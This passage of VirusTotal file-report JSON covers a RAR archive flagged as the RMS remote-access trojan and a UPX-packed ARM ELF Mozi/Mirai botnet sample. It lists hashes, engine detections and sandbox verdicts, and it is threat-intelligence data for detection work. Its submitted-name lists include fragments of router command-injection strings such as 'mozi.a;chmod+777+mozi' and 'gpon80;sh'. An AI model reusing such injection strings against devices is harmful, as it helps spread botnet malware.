          "engine_update": "20240125"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Bsymem.qybuz",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "BackDoor.RMS.230",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.VSNTAM24",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Spy.Agent",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "240125-02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W64/ABRisk.SNHI-7605",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Bsymem.qybuz",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "malicious",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.156.174",
          "result": "Trojan.U.Gen.tr",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36379",
          "result": "ApplicUnwnt@#34tp9n31u9dy9",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "HackTool:Win32/RemoteAdmin!MSR",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.Win32.Bsymem.apya",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37236B:27.34697",
          "result": "Archive.Trojan.Agent.Z5VRKZ",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1706247020",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "HackTool.RemoteUtilities!8.49C (CLOUD)",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.226688521.susgen",
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "Riskware/RemoteAdmin_RemoteUtilities",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win64:Malware-gen",
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Cybereason": {
          "category": "timeout",
          "engine_name": "Cybereason",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        }
      },
      "trid": [
        {
          "file_type": "RAR compressed archive (v5.0)",
          "probability": 61.5
        },
        {
          "file_type": "RAR compressed archive (gen)",
          "probability": 38.4
        }
      ],
      "sandbox_verdicts": {
        "C2AE": {
          "category": "malicious",
          "confidence": 50,
          "sandbox_name": "C2AE",
          "malware_classification": [
            "RAT"
          ],
          "malware_names": [
            "RMS"
          ]
        }
      },
      "sha256": "20ab498b278b14f3786f634778a04d219c74e9fd8517b98f4aca313c9934b7f2",
      "type_extension": "rar",
      "tags": [
        "rar"
      ],
      "last_analysis_date": 1706256409,
      "unique_sources": 34,
      "first_submission_date": 1705889337,
      "ssdeep": "393216:hEPPp5MO9/LXjaB2LUPdtiY0NyyNXV1nUepybF/N:hEnp5MK/LXmBfPdEMVeIh1",
      "md5": "21e4a83a29d2ff9f76ec9bcf15ac4496",
      "sha1": "06b5e8071ed87d62d09409b44ceec37c8cb60fac",
      "magic": "RAR archive data, v5",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 12,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 2,
        "failure": 0,
        "malicious": 32,
        "undetected": 29
      },
      "meaningful_name": "20ab498b278b14f3786f634778a04d219c74e9fd8517b98f4aca313c9934b7f2.rar",
      "reputation": -9
    },
    "type": "file",
    "id": "20ab498b278b14f3786f634778a04d219c74e9fd8517b98f4aca313c9934b7f2",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/20ab498b278b14f3786f634778a04d219c74e9fd8517b98f4aca313c9934b7f2"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f65d247565d4a4ddef04"
  },
  "data": {
    "attributes": {
      "type_description": "ELF",
      "tlsh": "T1B2930272135417C5894772B4209409F5363AA265FCBF34FBBF93C66027834BCD49BAA2",
      "vhash": "0170eed705a146b74a837bd5800a6f0c",
      "type_tags": [
        "executable",
        "linux",
        "elf"
      ],
      "crowdsourced_yara_results": [
        {
          "ruleset_id": "015eaa9454",
          "rule_name": "Linux_Packer_Patched_UPX_62e11c64",
          "ruleset_name": "Linux_Packer_Patched_UPX",
          "source": "https://github.com/elastic/protections-artifacts",
          "author": "Elastic Security"
        },
        {
          "description": "Detects a suspicious ELF binary with UPX compression",
          "source": "https://github.com/Neo23x0/signature-base",
          "author": "Florian Roth (Nextron Systems)",
          "ruleset_name": "gen_elf_file_anomalies",
          "rule_name": "SUSP_ELF_LNX_UPX_Compressed_File",
          "ruleset_id": "0004c84a86"
        }
      ],
      "names": [
        "Mozi.m",
        "Mozi.a",
        "mozi.a",
        "Mozi.m%22,%22IndicatorExpirationDateTime%22:%222023-03-31T02:09:30Z%22,%22Attributable%22:false,%22IndicatorProviderId%22:%22db427ccb-7ac4-4ab9-a0ea-a4691dd1c7ea%22,%22IndicatorPriority%22:3",
        "Mozi.elf",
        "Tu3qiOV9.zip",
        "mozi.m",
        "ZfKvE7ZH.zip",
        "9a111588a7db15b796421bd13a949cd4_Mozi.m",
        "9a111588a7db15b796421bd13a949cd4_Mozi.a",
        "Mozi.a+jaws",
        "&currentsetting.htm=1",
        "e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0.json",
        "aqG7n-H6.zip",
        "(1.246.222.94)Mozi.m+",
        "gpon80;sh",
        "index.html",
        "다운로드 (1).zip",
        "230611_Mozi.m",
        "d63vkwXz.zip",
        "9a111588a7db15b796421bd13a949cd4=Mozi.m=1.246.222.38_2356-Mozi.m-",
        "다운로드.zip",
        "e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0",
        "i;",
        "Mozi",
        "1682229813.57885.txt",
        "networks",
        "gandylyan1",
        "netgear;sh%20netgear&curpath",
        "mozi.m%22,%25",
        "mozi.m+-o%252",
        "mozi.m,online",
        "mozi.a%20j",
        "%252",
        "mozi.m%22,%22online%22,%22malware_download%22,%22elf,mozi%22,%22https",
        "%22Gandylyan1",
        "mozi.m%22,%22online%22,%22malware_download%22,%22el",
        "mozi.a;chmod+777+mozi",
        "mozi.a+jaws",
        "urlhaus.abuse.ch",
        "mozi.m,online%252",
        "mozi.m+-o+-",
        "mozi.a+j",
        "mozi.m,online,",
        "%22gandylyan1",
        "mozi.a;chmod+777+",
        "mozi.m%20-o%252",
        "(211.105.132.63)Mozi.m+",
        "(1.246.223.71)Mozi.m &&",
        "(1.246.223.6)Mozi.m &&",
        "(222.243.14.67)Mozi.m+",
        "Mozi.a%20jaws",
        "i%20%20Row:%203;%20Column:%201",
        "fuck",
        "tmp",
        "output.225135038.txt",
        "output.225135068.txt",
        "output.223137249.txt",
        "output.223087104.txt",
        "output.223087149.txt",
        "output.223087127.txt",
        "Mozi.m.bak",
        "output.223723498.txt",
        "%C2%A4tsetting.htm=1",
        "Mozi.m+-O+-",
        "output.217795123.txt",
        "output.217795141.txt",
        "output.219035076.txt",
        "netgear",
        "mozi.m+-o",
        "Mozi.%E3%85%81",
        "mozi.m%20-o",
        "output.216729905.txt",
        "output.216696652.txt",
        "output.216696627.txt",
        "output.216729896.txt",
        "output.217085268.txt",
        "output.215758021.txt",
        "output.216033034.txt",
        "output.216359304.txt",
        "output.216037127.txt",
        "output.215645340.txt",
        "output.216608463.txt",
        "13096841355.pdf",
        "output.215358768.txt",
        "output.214552138.txt",
        "output.215358764.txt",
        "output.214552156.txt",
        "output.213738940.txt",
        "output.213738939.txt",
        "output.213889547.txt",
        "output.213889095.txt",
        "output.213889092.txt",
        "output.213889551.txt",
        "output.213804199.txt",
        "다운로드 (2).zip"
      ],
      "last_modification_date": 1706069742,
      "type_tag": "elf",
      "elf_info": {
        "header": {
          "hdr_version": "1 (current)",
          "type": "EXEC (Executable file)",
          "num_prog_headers": 2,
          "obj_version": "0x1",
          "machine": "ARM",
          "num_section_headers": 0,
          "os_abi": "ARM - ABI",
          "abi_version": 0,
          "entrypoint": 125464,
          "data": "2's complement, little endian",
          "class": "ELF32"
        },
        "segment_list": [
          {
            "segment_type": "LOAD",
            "resources": []
          },
          {
            "segment_type": "LOAD",
            "resources": []
          }
        ],
        "packers": [
          "upx"
        ]
      },
      "times_submitted": 2876,
      "total_votes": {
        "harmless": 0,
        "malicious": 16
      },
      "size": 95268,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.gafgyt/mirai",
        "popular_threat_category": [
          {
            "count": 25,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 18,
            "value": "gafgyt"
          },
          {
            "count": 8,
            "value": "mirai"
          },
          {
            "count": 3,
            "value": "cryp"
          }
        ]
      },
      "detectiteasy": {
        "filetype": "ELF32",
        "values": [
          {
            "info": "NRV,best",
            "version": "3.91",
            "type": "Packer",
            "name": "UPX"
          }
        ]
      },
      "last_submission_date": 1705141220,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Linux.Gafgyt.m!c",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "Linux.Packer.Patched.UPX",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Linux.Mirai.FSN",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "ELF.Mozi.Trojan.38281",
          "method": "blacklist",
          "engine_update": "20240107"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Linux/Gafgyt.gen.b",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "Linux/Gafgyt.gen.b",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5028",
          "result": "Backdoor.Mirai.Linux.87935",
          "method": "blacklist",
          "engine_update": "20240105"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Win32.Skeeyah.A",
          "method": "blacklist",
          "engine_update": "20240106"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.135.50672",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.135.50670",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Linux.Mirai.FSN",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.613",
          "result": "Linux.BackDoor.Fgt.EKS",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "Trojan.Gen.2",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28535",
          "result": "Linux/Mozi.A",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Backdoor.Linux.GAFGYT.ANY",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "ELF:Gafgyt-AN [Cryp]",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Unix.Malware.Agent-7423818-0",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Backdoor.Linux.Gafgyt.a",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Linux.Mirai.FSN",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.ElfArm32.Mlw.gqfrei",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.487",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240107"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Linux.Agent.w",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.Linux.Mirai.FSN (B)",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Malware.LINUX/Gafgyt.ziepu",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Linux.Mirai.7891",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Linux.Mirai.FSN",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Backdoor.Linux.GAFGYT.ANY",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Linux/DDoS-DI",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Linux.Gafgyt",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37127B:27.34492",
          "result": "Trojan.Linux.Mirai.FSN",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "Backdoor.Linux.dzom",
          "method": "blacklist",
          "engine_update": "20240107"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "E32/Gafgyt.DS",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "LINUX/Gafgyt.ziepu",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[Backdoor]/Linux.Mozi",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Linux.Troj.Gafgyt.zp",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.154.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36328",
          "result": "Malware@#2iyq7iz6nycbc",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Backdoor:Linux/Gafgyt.B!MTB",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "Linux.S.Agent.95268",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Backdoor.Linux.Gafgyt.a",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Avast-Mobile": {
          "category": "malicious",
          "engine_name": "Avast-Mobile",
          "engine_version": "240108-00",
          "result": "ELF:Gafgyt-AN [Cryp]",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1704736858",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Linux/Truncpx.94360",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-08.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Backdoor.Gafgyt/Linux!1.C9CA (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=100)",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "ELF/Gafgyt.AN!tr",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "ELF:Gafgyt-AN [Cryp]",
          "method": "blacklist",
          "engine_update": "20240108"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240108"
        }
      },
      "trid": [
        {
          "file_type": "ELF Executable and Linkable format (Linux)",
          "probability": 50.1
        },
        {
          "file_type": "ELF Executable and Linkable format (generic)",
          "probability": 49.8
        }
      ],
      "sandbox_verdicts": {
        "Zenbox Linux": {
          "category": "malicious",
          "confidence": 92,
          "sandbox_name": "Zenbox Linux",
          "malware_classification": [
            "MALWARE",
            "SPREADER",
            "TROJAN",
            "EVADER"
          ],
          "malware_names": [
            "Mirai"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0",
      "tags": [
        "sets-process-name",
        "service-scan",
        "elf",
        "detect-debug-environment",
        "upx",
        "checks-cpu-name",
        "persistence"
      ],
      "last_analysis_date": 1704741607,
      "unique_sources": 85,
      "first_submission_date": 1575144609,
      "sha1": "034c8c51a58be11ca620ce3eb0d43d5a59275d2f",
      "ssdeep": "1536:pymLLU1F5kHIrIj0D6rhfd+lK3exiTCzxNtI4sZLi6UEbFEBFaW1EH6t6wfPP/Q:2F+ooxalK3exiTOijZLdUEbFlWPP/Q",
      "packers": {
        "Gandelf": "upx"
      },
      "md5": "9a111588a7db15b796421bd13a949cd4",
      "androguard": {
        "AndroidApplicationError": false,
        "AndroidApplicationInfo": "ELF",
        "AndroguardVersion": "3.0-dev",
        "VTAndroidInfo": 1.41,
        "AndroidApplication": 7
      },
      "magic": "ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, no section header",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 13,
